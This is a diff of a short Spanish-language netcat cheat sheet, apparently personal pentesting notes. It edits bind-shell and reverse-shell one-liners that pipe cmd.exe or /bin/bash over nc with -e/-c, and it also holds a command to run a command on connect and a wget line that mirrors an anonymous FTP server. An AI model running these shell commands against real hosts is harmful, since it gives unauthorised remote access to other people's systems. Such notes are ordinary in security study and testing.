@@ -7,16 +7,16 @@ Transferencia de archivos
 
 
 Conectarte a programa y redireccionar salida por nc
-    nc -lvvp [puerto] -e cmd.exe
+    nc -lvvp [puerto] -e/-c cmd.exe
     nc -v [ip] [puerto]
 
 
 Conectar programa a servidor en escucha y redireccionar salida por nc
     nc -lvvp [puerto]
-    nc -v [ip] [puerto] -e /bin/bash
+    nc -v [ip] [puerto] -e/-c /bin/bash
     
 Ejecutar comando tras conectar nc
-	nc IP PUERTO -c COMANDO (lo ejecuta /bin/sh)
+	nc IP PUERTO -c COMANDO (lo ejecuta /bin/sh)/ -e (lo ejecuta exec)
 
 Descargar todo de ftp
 	wget -m --no-passive ftp://anonymous:anonymous@IP
